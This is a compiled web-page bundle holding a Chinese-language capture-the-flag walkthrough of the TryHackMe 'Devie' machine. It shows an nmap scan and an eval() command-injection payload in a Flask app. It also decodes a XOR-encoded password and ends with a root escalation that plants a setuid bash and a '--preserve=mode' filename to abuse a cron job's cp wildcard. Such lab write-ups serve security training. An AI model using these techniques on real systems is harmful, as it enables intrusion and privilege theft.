"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[2783],{92647:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>u,frontMatter:()=>i,metadata:()=>a,toc:()=>d});var o=r(74848),t=r(28453);const i={sidebar_position:154,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","\u5b9a\u65f6\u4efb\u52a1","\u901a\u4f69\u7b26\u5229\u7528"],title:"Devie",description:"Devie",sidebar_label:"Devie",slug:"/tryhackme/154"},s="Devie",a={id:"box/TryHackMe/154",title:"Devie",description:"Devie",source:"@site/docs/box/TryHackMe/154.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/154",permalink:"/docs/tryhackme/154",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"},{label:"\u901a\u4f69\u7b26\u5229\u7528",permalink:"/docs/tags/\u901a\u4f69\u7b26\u5229\u7528"}],version:"current",sidebarPosition:154,frontMatter:{sidebar_position:154,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","\u5b9a\u65f6\u4efb\u52a1","\u901a\u4f69\u7b26\u5229\u7528"],title:"Devie",description:"Devie",sidebar_label:"Devie",slug:"/tryhackme/154"},sidebar:"boxSidebar",previous:{title:"One Piece",permalink:"/docs/tryhackme/153"},next:{title:"KoTH Hackers",permalink:"/docs/tryhackme/155"}},c={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"5000",id:"5000",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"bruce",id:"bruce",level:3},{value:"bruce \u2014&gt; gordon",id:"bruce--gordon",level:3},{value:"gordon \u2014&gt; root",id:"gordon--root",level:3}];function l(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h1,{id:"devie",children:"Devie"}),"\n",(0,o.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-231-42:~# nmap -sTCV -p 22,5000 --min-rate 1000 $IP\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-08 03:54 BST\nNmap scan report for ip-10-10-90-134.eu-west-1.compute.internal (10.10.90.134)\nHost is up (0.000093s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n5000/tcp open  upnp?\n| fingerprint-strings: \n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.1.2 Python/3.8.10\n|     Date: Sun, 08 Oct 2023 02:55:01 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 4486\n|     Connection: close\n"})}),"\n",(0,o.jsx)(n.h2,{id:"5000",children:"5000"}),"\n",(0,o.jsx)(n.p,{children:"\u8bbf\u95ee\u6211\u4eec\u7684\u7f51\u7ad9, \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u5176\u662f\u4e00\u4e2a\u8ba1\u7b97\u7684\u7f51\u7ad9, \u5e76\u4e14\u4ece\u7aef\u53e3\u626b\u63cf\u7684\u7ed3\u679c\u6765\u770b\u662f\u4e00\u4e2a Python \u7684\u7a0b\u5e8f, \u5728\u7f51\u7ad9\u5e95\u90e8\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5b83\u63d0\u4f9b\u4e86\u7f51\u7ad9\u7684\u6e90\u4ee3\u7801, \u6211\u4eec\u5c06\u5176\u4e0b\u8f7d\u4e0b\u6765\u8fdb\u884c\u5206\u6790, \u6211\u53d1\u73b0\u5176\u4e2d\u5b58\u5728\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",children:'@app.route("/")\ndef bisect(xa,xb):\n    added = xa + " + " + xb\n    c = eval(added)\n    c = int(c)/2\n    ya = (int(xa)**6) - int(xa) - 1 #f(a)\n    yb = (int(xb)**6) - int(xb) - 1 #f(b)\n'})}),"\n",(0,o.jsxs)(n.p,{children:["\u5bf9\u4e8e\u4e0a\u8ff0\u4ee3\u7801, \u5728 ",(0,o.jsx)(n.code,{children:"eval()"})," \u51fd\u6570\u5904\u8fdb\u884c\u64cd\u4f5c, \u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u6765\u6267\u884c\u547d\u4ee4, \u56e0\u4e3a\u65e0\u6cd5\u8fdb\u884c\u660e\u6587\u7684\u8f93\u51fa\u663e\u793a, \u6240\u4ee5\u6211\u501f\u52a9 ICMP \u8fdb\u884c\u64cd\u4f5c"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",children:"__import__('os').system('ping 10.10.231.42')\n"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-190214.png",alt:"image-20240709190213244"})}),"\n",(0,o.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,o.jsx)(n.h3,{id:"bruce",children:"bruce"}),"\n",(0,o.jsx)(n.p,{children:"\u4f7f\u7528\u4e0a\u9762\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u4e00\u4e2a Shell"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-190338.png",alt:"image-20240709190337204"})}),"\n",(0,o.jsx)(n.h3,{id:"bruce--gordon",children:"bruce \u2014> gordon"}),"\n",(0,o.jsx)(n.p,{children:"\u6267\u884c SUDO \u547d\u4ee4\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u53ef\u4ee5\u4ee5 gordon \u7528\u6237\u6267\u884c\u547d\u4ee4"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-190346.png",alt:"image-20240709190345292"})}),"\n",(0,o.jsx)(n.p,{children:"\u4f46\u662f\u53ef\u60dc\u7684\u662f\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u7528\u6765\u52a0\u5bc6\u7684, \u6ca1\u6709\u529e\u6cd5\u5229\u7528, \u63a5\u7740\u5728 bruce \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u6211\u53d1\u73b0\u4e00\u4e2a note \u6587\u4ef6\u5176\u4e2d\u544a\u8bc9\u6211\u4e00\u4e9b\u4e8b\u60c5"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:"\u4f7f\u7528 XOR \u52a0\u5bc6\u5e76\u4e14\u8fdb\u884c base64 \u7f16\u7801"}),"\n",(0,o.jsx)(n.li,{children:"\u4e00\u4e2a\u660e\u6587 : NEUEDTIeN1MRDg5K"}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"(remote) bruce@devie:/home/bruce$ cat note \nHello Bruce,\n\nI have encoded my password using the super secure XOR format.\n\nI made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.\n\nFor now look at this super secure string:\nNEUEDTIeN1MRDg5K\n\nGordon\n"})}),"\n",(0,o.jsxs)(n.p,{children:["\u63a5\u7740\u6211\u4fbf\u5229\u7528 XOR \u7684\u4e00\u4e2a\u539f\u7406, \u8fdb\u884c\u4e00\u4e9b\u89e3\u5bc6\u7684\u64cd\u4f5c\u4f7f\u7528\u4e0a\u9762\u5f97\u5230\u7684\u5bc6\u6587\u8fdb\u884c\u7f16\u7801, \u7136\u540e\u4f7f\u7528\u7f16\u7801\u51fa\u6765\u7684\u7ed3\u679c\u4f5c\u4e3a\u5bc6\u6587\u4f7f\u7528\u5bc6\u6587\u4f5c\u4e3a key \u8fdb\u884c\u89e3\u7801 ",(0,o.jsx)(n.a,{href:"https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9+/=',true,false)XOR(%7B'option':'UTF8','string':'NEUEDTIeN1MRDg5K'%7D,'Standard',false)&input=UFRBbElEWW5MQVk4VkRrNUlSNU5KQT09",children:"CyberChef"})," , \u6700\u7ec8\u6211\u83b7\u53d6\u5230 XOR \u52a0\u5bc6\u7684 Key \u63a5\u7740\u6211\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\u83b7\u53d6\u5230\u4e86\u6700\u7ec8\u7684\u660e\u6587, ",(0,o.jsx)(n.a,{href:"https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9+/=',true,false)XOR(%7B'option':'UTF8','string':'supersecretkeyxo'%7D,'Standard',false)&input=TkVVRURUSWVOMU1SRGc1Sw",children:"CyberChef"})," \u4f7f\u7528\u89e3\u5bc6\u51fa\u6765\u7684\u660e\u6587\u4f5c\u4e3a\u7528\u6237 gordon \u7684\u5bc6\u7801, \u6211\u4eec\u5c31\u53ef\u4ee5\u5b8c\u6210\u7528\u6237\u7684\u7a83\u53d6\u4e86"]}),"\n",(0,o.jsx)(n.h3,{id:"gordon--root",children:"gordon \u2014> root"}),"\n",(0,o.jsx)(n.p,{children:"\u5728\u7528\u6237\u7684\u5bb6\u76ee\u5f55\u8fdb\u884c\u641c\u7d22\u65f6\u53d1\u73b0\u4e00\u4e2a\u7279\u6b8a\u7684\u4e8b\u60c5 : backups \u548c reports \u7684\u6587\u4ef6\u5185\u5bb9\u4e00\u6837\u5e76\u4e14\u540d\u79f0\u76f8\u540c, \u540c\u65f6 backups \u7684\u7a0b\u5e8f\u662f\u6700\u65b0\u521b\u5efa\u7684, \u6240\u4ee5\u6211\u6000\u7591\u8fd9\u91cc\u5b58\u5728\u5b9a\u65f6\u4efb\u52a1, \u63a5\u7740\u67e5\u627e\u5c5e\u4e8e gordon \u7528\u6237\u7684\u6587\u4ef6\u65f6, \u6211\u53d1\u73b0\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"(remote) bruce@devie:/home/bruce$ find / -user root -group gordon -ls 2>/dev/null\n   403597      4 -rw-r-----   1 root     gordon        485 Aug  2  2022 /opt/encrypt.py\n    12272      4 -rwxr-----   1 root     gordon         66 May 12  2022 /usr/bin/backup\n   403598      4 -rw-r-----   1 root     gordon         21 Aug  2  2022 /home/gordon/flag2.txt\ngordon@devie:~/backups$ cat /usr/bin/backup\n#!/bin/bash\n\ncd /home/gordon/reports/\n\ncp * /home/gordon/backups/\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u7ed3\u5408 backups \u4e0b\u7684\u6587\u4ef6\u90fd\u662f root \u7528\u6237\u7684, \u6240\u4ee5\u6211\u5224\u65ad\u8fd9\u4fbf\u662f\u5b9a\u65f6\u4efb\u52a1\u7684\u5229\u7528, \u63a5\u7740\u5229\u7528 cp \u7684\u901a\u914d\u7b26\u5b8c\u6210\u63d0\u6743"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'gordon@devie:~/reports$ cp /bin/bash ./bash && chmod u+s ./bash && echo "" > "--preserve=mode"\ngordon@devie:~/backups$ ls -al\ntotal 1176\ndrwxrwx--- 2 gordon gordon    4096 Oct  8 04:47 .\ndrwxr-xr-x 4 gordon gordon    4096 Aug  2  2022 ..\n-rwsr-xr-x 1 root   root   1183448 Oct  8 04:49 bash\n-rw-r--r-- 1 root   root        57 Oct  8 04:49 report1\n-rw-r--r-- 1 root   root        72 Oct  8 04:49 report2\n-rw-r--r-- 1 root   root       100 Oct  8 04:49 report3\ngordon@devie:~/backups$ ./bash -p\ngordon@devie:~/backups# id\nuid=1001(gordon) gid=1001(gordon) euid=0(root) groups=1001(gordon)\n'})})]})}function u(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(l,{...e})}):l(e)}},28453:(e,n,r)=>{r.d(n,{R:()=>s,x:()=>a});var o=r(96540);const t={},i=o.createContext(t);function s(e){const n=o.useContext(i);return o.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:s(e.components),o.createElement(i.Provider,{value:n},e.children)}}}]);